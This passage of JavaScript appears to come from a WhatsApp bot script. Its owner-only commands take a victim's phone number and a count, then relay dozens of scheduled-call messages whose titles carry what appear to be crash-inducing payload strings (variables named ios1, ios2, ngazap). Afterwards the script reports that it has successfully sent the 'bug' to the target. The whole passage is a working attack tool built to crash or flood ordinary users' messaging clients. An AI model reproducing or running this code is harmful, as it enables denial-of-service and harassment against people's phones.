attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
}
zetsreply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
}
break
case '🌊': case '🌈': case 'sendvpriv': case '🍆': case '🌏': case '🌎': case '🌍': case 'sendvpc': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
Pe = q.split(",")[0]+"@s.whatsapp.net"
jumlah = q.split(",")[1]
attention = async (teks) => {
let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: from, quoted: kalgans })
zetsubo.relayMessage(Pe, schedule.message, { messageId: schedule.key.id })
	}
for (let i = 0; i < jumlah; i++) {
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜- ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
